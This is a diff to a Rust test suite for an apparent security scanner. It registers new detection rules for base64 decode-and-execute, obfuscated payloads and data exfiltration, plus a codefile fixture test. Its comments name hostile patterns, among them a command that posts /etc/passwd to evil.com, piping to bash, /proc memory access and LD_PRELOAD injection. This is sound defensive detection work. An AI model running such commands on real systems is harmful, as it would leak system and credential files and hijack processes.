@@ -267,6 +267,16 @@ fn test_credential_fixtures() {
     eprintln!("Passed {count} credential fixtures");
 }
 
+#[test]
+fn test_codefile_fixtures() {
+    let fixtures = load_fixtures("codefile.toml");
+    let count = fixtures.len();
+    for fixture in &fixtures {
+        run_fixture(fixture);
+    }
+    eprintln!("Passed {count} codefile fixtures");
+}
+
 /// Verify total fixture count across all files.
 #[test]
 fn test_fixture_count() {
@@ -284,6 +294,7 @@ fn test_fixture_count() {
         "configfile.toml",
         "rendered.toml",
         "credential.toml",
+        "codefile.toml",
     ];
 
     let total: usize = files.iter().map(|f| load_fixtures(f).len()).sum();
@@ -392,6 +403,7 @@ const ALL_FIXTURE_FILES: &[&str] = &[
     "configfile.toml",
     "rendered.toml",
     "credential.toml",
+    "codefile.toml",
 ];
 
 /// Complete list of all RuleId variants (snake_case serialized form).
@@ -439,6 +451,12 @@ const ALL_RULE_IDS: &[&str] = &[
     "proc_mem_access",
     "docker_remote_priv_esc",
     "credential_file_sweep",
+    "base64_decode_execute",
+    "data_exfiltration",
+    // Code file scan
+    "dynamic_code_execution",
+    "obfuscated_payload",
+    "suspicious_code_exfiltration",
     // Environment
     "proxy_env_set",
     "sensitive_env_export",
@@ -467,6 +485,7 @@ const ALL_RULE_IDS: &[&str] = &[
     "npm_url_install",
     "web3_rpc_endpoint",
     "web3_address_in_url",
+    "vet_not_configured",
     // Rendered content
     "hidden_css_content",
     "hidden_color_content",
@@ -532,11 +551,12 @@ const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     "policy_blocklisted",
     "command_network_deny",
     "license_required",
-    "custom_rule_match", // requires custom_rules in policy (Team-only)
-    "server_cloaking",   // requires network fetch (Unix-only)
-    "clipboard_hidden",  // requires --html clipboard input
-    "pdf_hidden_text",   // requires .pdf file input
-    "config_malformed",  // requires MCP config filename context in file scan
+    "custom_rule_match",  // requires custom_rules in policy (Team-only)
+    "server_cloaking",    // requires network fetch (Unix-only)
+    "clipboard_hidden",   // requires --html clipboard input
+    "pdf_hidden_text",    // requires .pdf file input
+    "config_malformed",   // requires MCP config filename context in file scan
+    "vet_not_configured", // requires cargo install without cargo-vet
 ];
 
 #[test]
@@ -606,6 +626,11 @@ fn test_rule_id_list_is_complete() {
         RuleId::ProcMemAccess,
         RuleId::DockerRemotePrivEsc,
         RuleId::CredentialFileSweep,
+        RuleId::Base64DecodeExecute,
+        RuleId::DataExfiltration,
+        RuleId::DynamicCodeExecution,
+        RuleId::ObfuscatedPayload,
+        RuleId::SuspiciousCodeExfiltration,
         RuleId::ProxyEnvSet,
         RuleId::SensitiveEnvExport,
         RuleId::CodeInjectionEnv,
@@ -630,6 +655,7 @@ fn test_rule_id_list_is_complete() {
         RuleId::NpmUrlInstall,
         RuleId::Web3RpcEndpoint,
         RuleId::Web3AddressInUrl,
+        RuleId::VetNotConfigured,
         RuleId::HiddenCssContent,
         RuleId::HiddenColorContent,
         RuleId::HiddenHtmlAttribute,
@@ -678,29 +704,34 @@ fn test_no_url_rules_have_no_url_fixtures() {
     let no_url_rules: HashSet<&str> = [
         "dotfile_overwrite",
         "archive_extract",
-        "pipe_to_interpreter",       // cat script | bash
-        "bidi_controls",             // exec context, no URL needed
-        "zero_width_chars",          // exec context, no URL needed
-        "unicode_tags",              // byte-level, no URL needed
-        "invisible_math_operator",   // byte-level, no URL needed
-        "invisible_whitespace",      // byte-level, no URL needed
-        "proc_mem_access",           // /proc/*/mem access, no URL needed
-        "credential_file_sweep",     // multi-credential file access, no URL needed
-        "code_injection_env",        // export LD_PRELOAD=, no URL needed
-        "shell_injection_env",       // export BASH_ENV=, no URL needed
-        "interpreter_hijack_env",    // export PYTHONPATH=, no URL needed
-        "sensitive_env_export",      // export OPENAI_API_KEY=, no URL needed
-        "config_injection",          // file context, no URL needed
-        "config_non_ascii",          // file context, no URL needed
-        "config_invisible_unicode",  // file context, no URL needed
-        "mcp_suspicious_args",       // file context, no URL needed
-        "mcp_overly_permissive",     // file context, no URL needed
-        "mcp_duplicate_server_name", // file context, no URL needed
-        "metadata_endpoint",         // bare IP: curl 169.254.169.254/path
-        "private_network_access",    // bare IP: curl 10.0.0.1/path
-        "credential_in_text",        // token/key in text, no URL needed
-        "high_entropy_secret",       // high-entropy secret assignment, no URL needed
-        "private_key_exposed",       // PEM key block, no URL needed
+        "pipe_to_interpreter",          // cat script | bash
+        "bidi_controls",                // exec context, no URL needed
+        "zero_width_chars",             // exec context, no URL needed
+        "unicode_tags",                 // byte-level, no URL needed
+        "invisible_math_operator",      // byte-level, no URL needed
+        "invisible_whitespace",         // byte-level, no URL needed
+        "proc_mem_access",              // /proc/*/mem access, no URL needed
+        "credential_file_sweep",        // multi-credential file access, no URL needed
+        "code_injection_env",           // export LD_PRELOAD=, no URL needed
+        "shell_injection_env",          // export BASH_ENV=, no URL needed
+        "interpreter_hijack_env",       // export PYTHONPATH=, no URL needed
+        "sensitive_env_export",         // export OPENAI_API_KEY=, no URL needed
+        "config_injection",             // file context, no URL needed
+        "config_non_ascii",             // file context, no URL needed
+        "config_invisible_unicode",     // file context, no URL needed
+        "mcp_suspicious_args",          // file context, no URL needed
+        "mcp_overly_permissive",        // file context, no URL needed
+        "mcp_duplicate_server_name",    // file context, no URL needed
+        "metadata_endpoint",            // bare IP: curl 169.254.169.254/path
+        "private_network_access",       // bare IP: curl 10.0.0.1/path
+        "credential_in_text",           // token/key in text, no URL needed
+        "high_entropy_secret",          // high-entropy secret assignment, no URL needed
+        "private_key_exposed",          // PEM key block, no URL needed
+        "base64_decode_execute",        // base64 decode chain, no URL needed
+        "data_exfiltration",            // curl -d @/etc/passwd evil.com, schemeless
+        "dynamic_code_execution",       // file scan, no URL needed
+        "obfuscated_payload",           // file scan, no URL needed
+        "suspicious_code_exfiltration", // file scan, no URL needed
     ]
     .into_iter()
     .collect();
@@ -774,6 +805,7 @@ fn test_extractor_ids_cover_rule_triggers() {
         ("ecosystem rules", &["standard_url", "docker_command"]),
         // Command shape rules need their own patterns
         ("pipe-to-interpreter", &["pipe_to_interpreter"]),
+        ("base64 decode-execute", &["base64_decode_execute"]),
         ("dotfile overwrite", &["dotfile_overwrite"]),
         ("archive extract", &["archive_extract_sensitive"]),
         // PowerShell rules
